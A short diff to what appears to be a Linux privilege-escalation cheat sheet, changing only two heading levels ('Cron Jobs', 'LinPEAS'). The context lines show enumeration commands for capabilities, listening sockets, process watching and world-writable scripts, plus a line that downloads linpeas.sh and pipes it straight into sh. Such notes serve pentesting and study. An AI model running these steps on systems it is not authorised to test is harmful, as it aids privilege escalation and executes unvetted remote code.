@@ -191,7 +191,7 @@ getcap -r / 2>/dev/null
 ss -nltp
 ```
 
- # Cron Jobs
+ ### Cron Jobs
  
 ```bash
 # Cron files
@@ -214,7 +214,7 @@ old_ps=$(ps -eo user,command); while true; do; new_ps=$(ps -eo user,command); di
 find / -user <USER> -perm -o+w \( -name \"*.sh\" -O -name \"*.py\" -O -name \"*.pl\" -O -name \"*.rb\" -O -name \"*.go\" -O -name \"*.lua\" \) 2>/dev/null
 ```
 
- # LinPEAS
+ ### LinPEAS
  
 ```bash
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
